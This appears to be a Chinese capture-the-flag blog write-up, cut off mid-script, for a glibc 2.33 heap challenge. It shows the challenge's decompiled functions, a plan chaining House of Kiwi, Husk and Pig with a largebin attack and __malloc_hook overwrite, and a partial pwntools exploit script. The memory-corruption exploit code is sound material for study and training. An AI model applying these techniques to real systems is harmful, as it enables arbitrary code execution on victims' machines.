class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    error(<span class="hljs-string">&quot;File urandom Open Failed&quot;</span>);<br>  read(fd, &amp;buf, <span class="hljs-number">5uLL</span>);<br>  Heap_arena = (__int64)mmap((<span class="hljs-type">void</span> *)(buf &amp; <span class="hljs-number">0xFFFFFFFFF000</span>LL), <span class="hljs-number">0x3000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Add"><a class="header-anchor" href="#Add">Â¶</a>Add</h4><p><strong>calloc</strong> å°±ç®—äº†ï¼Œè¿™ç©æ„ add çš„æ—¶å€™æ²¡æœ‰ç»™ ğŸ‘´ è¾“å…¥æ•°æ®çš„æœºä¼šï¼ŒğŸ‘´ æœ‰ç‚¹éš¾å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_14A9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Edit"><a class="header-anchor" href="#Edit">Â¶</a>Edit</h4><p>åªè¦åœ¨ mmap åˆ†é…çš„å †ä¸Šï¼ŒğŸ‘´ æƒ³ edit å“ªé‡Œï¼Œå°± edit å“ªé‡Œã€‚ä¸»è¦è¿™ä¸ª <strong>my_read</strong> é‡åˆ° <strong>â€˜\x0aâ€™</strong> ä¼šæˆªæ–­ï¼Œç¨å¾®æ³¨æ„ä¸€ä¸‹å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1513</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x1000</span> )<br>    error(<span class="hljs-string">&quot;Invalid size Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;offset: &quot;</span>, <span class="hljs-number">8uLL</span>);<br>  v2 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &gt;= <span class="hljs-number">0x2000</span> )<br>    error(<span class="hljs-string">&quot;Invalid offset Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  my_read(v2 + Heap_arena, v1);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Edit done\n&quot;</span>, <span class="hljs-number">0xA</span>uLL);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Dele"><a class="header-anchor" href="#Dele">Â¶</a>Dele</h4><p>åªè¦åœ¨ mmap åˆ†é…çš„å †ä¸Šï¼ŒğŸ‘´ æƒ³ free å“ªé‡Œï¼Œå°± free å“ªé‡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Free</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;idx: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0x3000</span> )<br>    error(<span class="hljs-string">&quot;Invalid idx Receviced&quot;</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)(Heap_arena + v1));<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Show"><a class="header-anchor" href="#Show">Â¶</a>Show</h4><p>leak çš„æ˜¯ buf å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ calloc çš„å †å—ã€‚å¯¹æˆ‘ä»¬çš„å †å¸ƒå±€æå‡ºäº†ä¸€äº›è¦æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1688</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  v1 = <span class="hljs-built_in">strlen</span>(buf);<br>  write(<span class="hljs-number">1</span>, buf, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exp-Kiwi-Husk-Pig-æˆé“¾"><a class="header-anchor" href="#Exp-Kiwi-Husk-Pig-æˆé“¾">Â¶</a>Exp.Kiwi -&gt; Husk -&gt; Pig æˆé“¾</h3><p>2.33 è¿˜æ˜¯æœ‰ hook çš„ï¼ŒPig æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p><p><strong>æ€è·¯ä»‹ç»</strong></p><ol><li>ç®€å•å¸ƒä¸ªå±€ï¼Œæœ‰ UAF æˆ‘ä»¬å¾ˆå®¹æ˜“åœ° leak å‡º libcã€‚</li><li>å†ç®€å•çš„æ‹¿ä¸ªå †åœ°å€ï¼Œæ•´å®Œäº‹å°±æŠŠå †æ¢å¤å›å»ï¼Œèµ·ç ä¸è¦å¸¦ä¸ª unsorted ä¸€ç›´ç©ï¼Œå®¹æ˜“å‡ºäº‹ã€‚</li><li>æ„é€ å‡ºåŒä¸€ idx ä¸‹çš„ Largebin å’Œ Unsortedbinï¼Œä¸º Largebin Attack ä½œå‡†å¤‡ã€‚</li><li>Largebin Attack å¼€å§‹ä¹± ğŸ‘ ï¼Œé€šå¸¸å¥½ä¸€ç‚¹çš„å¸ƒå±€åœ¨æœ‰ Edit çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å®ç°å¤šæ¬¡ Largebin Attakï¼ŒğŸ‘´ è¿™æ˜¯é€šå¸¸å¸ƒå±€æ‰€ä»¥å¤šæ¬¡â‘§æ˜¯é—®é¢˜ã€‚</li><li>å…ˆæ‰“å®Œ husk çš„ä¿©å¼ è¡¨ï¼Œåœ¨å¯¹åº”åç§»å¤„å†™ exit å‡½æ•°ã€‚ğŸ‘´ è¿™é‡Œæ‹¿çš„æ˜¯ <strong>%s</strong> ä¹Ÿå°±æ˜¯ $hex(ord(â€˜sâ€™)*8)=0x398$ ã€‚ä½ æ‹¿ <strong>%u</strong> ä¹Ÿå°±æ˜¯ <strong>0x3a8</strong> ä¹Ÿå½³äºã€‚</li><li>æ‰“ _IO_list_allï¼Œå¾…ä¼šå¸ƒç½® _IO_FILE é“¾å­ã€‚</li><li>æ‰“ main_arena çš„ topchunk ï¼Œå¦‚æœä½ æƒ³çš„è¯ï¼Œå» leak å‡ºçœŸæ­£çš„å †åœ°å€ï¼Œç„¶åé”™ä½æ‰“ size ï¼Œä¹Ÿ â‘§ æ˜¯ä¸å½³äºã€‚</li><li>åˆ†é…ä¸€ä¸ªå¤§å †å—ï¼Œ<strong>Kiwi</strong> é‡Œçš„ <strong>vfprintf</strong> å¯ä»¥è§¦å‘ <strong>Husk</strong> è¿›å…¥ <strong>exit</strong>ï¼Œç„¶ååœ¨  <strong>_IO_flush_all_lockp</strong> éå†æˆ‘ä»¬çš„ IO é“¾å­ï¼Œå®ç° <strong>Pig</strong> çš„æ‰‹æ³•ã€‚</li></ol><p><strong>IO é“¾è§£é‡Š</strong></p><p>ğŸ‘´ å»ºè®®å¸¦ ğŸ”¥ ä»”ç»†è·Ÿä¸€ä¸‹ <strong>_IO_str_overflow</strong> çš„æ±‡ç¼–å’Œæºç ã€‚</p><ol><li>è¿™é‡Œä¸»è¦æ˜¯ç”¨åˆ°äº† <strong>_IO_str_overflow</strong> é‡Œçš„éé¢„æœŸ <strong>malloc</strong> å †å—å’Œ <strong>memcpy</strong>ï¼Œç»“åˆæˆ‘ä»¬çš„ <strong>TcachePoisoning</strong>ï¼Œå¤šæ¬¡åˆ©ç”¨è¿™ä¸ª trickï¼Œè¾¾åˆ°äº†ä»»æ„å†™çš„åŠŸèƒ½ã€‚ğŸ‘´ è¿™é‡Œæ‰¬æ‰äº† <strong>__malloc_hook</strong> ã€‚</li><li><strong>_IO_str_overflow</strong> å‡½æ•°ä¸­ä¼šå°†æˆ‘ä»¬ IO ç»“æ„ä½“çš„ <strong>_IO_write_ptr</strong> æ”¾åˆ° <strong>rdx</strong>ï¼Œåˆ©äºé«˜ç‰ˆæœ¬ä¸‹çš„ <strong>setcontext+61</strong> çš„ç»•æ²™ç›’æ“ä½œã€‚</li><li>å› ä¸ºè¿™é¢˜æ²¡å¼€æ²™ç®±ï¼Œè¿™é‡Œåœ¨å †åœ°å€ä¸Šå†™ <code>/bin/sh\0</code>ï¼Œåœ¨ <strong>__malloc_hook</strong> å†™ systemï¼ŒæŠŠ <strong>malloc</strong> çš„ size æ§åˆ¶æˆ $(bin_sh-100)//2$ å°±å¯ä»¥ <strong>getshell</strong>ã€‚ æ ˆè¿ç§»åç»å…¸ <strong>pop rdi,ret;bin_sh;system;</strong> çš„å¸ƒå±€å½“ç„¶ä¹Ÿæ˜¯æ¬§å°…çš„ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,28897)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                       